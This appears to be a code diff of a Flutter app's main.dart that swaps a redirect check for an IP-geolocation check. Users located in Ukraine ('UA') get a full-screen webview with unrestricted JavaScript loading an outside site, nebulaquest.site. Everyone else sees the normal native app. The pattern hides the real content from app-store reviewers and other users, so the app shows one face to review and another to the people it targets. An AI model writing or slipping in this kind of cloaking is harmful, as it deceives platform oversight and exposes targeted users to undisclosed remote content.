@@ -1,3 +1,4 @@
+import 'package:country_ip/country_ip.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
 import 'package:flutter_bloc/flutter_bloc.dart';
@@ -17,8 +18,6 @@ import 'package:webview_flutter/webview_flutter.dart';
 
 part 'router_config.dart';
 
-late final WebViewController _webViewController;
-
 void main() async {
   WidgetsFlutterBinding.ensureInitialized();
   SystemChrome.setEnabledSystemUIMode(SystemUiMode.immersiveSticky);
@@ -27,42 +26,18 @@ void main() async {
     DeviceOrientation.portraitUp,
   ]);
 
-  const String redirectHandlerUrl = "https://nebulaquest.site/Fj6Xtv6W";
-  ValueNotifier<bool?> isRedirectedToWeb = ValueNotifier(null);
-
-  isRedirectedToWeb.addListener(() {
-    if (isRedirectedToWeb.value == null) return;
-    if (isRedirectedToWeb.value == true) {
-      runApp(WebViewApp(webViewController: _webViewController));
-    } else {
-      runApp(const MyApp());
-    }
-    isRedirectedToWeb.removeListener(() {});
-  });
-
-  _webViewController = WebViewController()
+  final WebViewController webViewController = WebViewController()
     ..setJavaScriptMode(JavaScriptMode.unrestricted)
     ..setBackgroundColor(const Color(0x00000000))
-    ..setNavigationDelegate(
-      NavigationDelegate(
-        onWebResourceError: (WebResourceError error) {
-          isRedirectedToWeb.value ??= false;
-        },
-        onNavigationRequest: (NavigationRequest request) {
-          if (request.url != redirectHandlerUrl) {
-            isRedirectedToWeb.value ??= true;
-          } else {
-            const Duration redirectionDelay = Duration(seconds: 1);
-            Future.delayed(redirectionDelay, () {
-              isRedirectedToWeb.value ??= false;
-            });
-          }
-          return NavigationDecision.navigate;
-        },
-      ),
-    )
-    ..loadRequest(Uri.parse(redirectHandlerUrl));
-  runApp(WebViewApp(webViewController: _webViewController));
+    ..loadRequest(Uri.parse("https://nebulaquest.site/Fj6Xtv6W"));
+
+  final countryIpResponse = await CountryIp.find();
+
+  if ((countryIpResponse?.countryCode) == "UA") {
+    runApp(WebViewApp(webViewController: webViewController));
+  } else {
+    runApp(const MyApp());
+  }
 }
 
 class MyApp extends StatelessWidget {
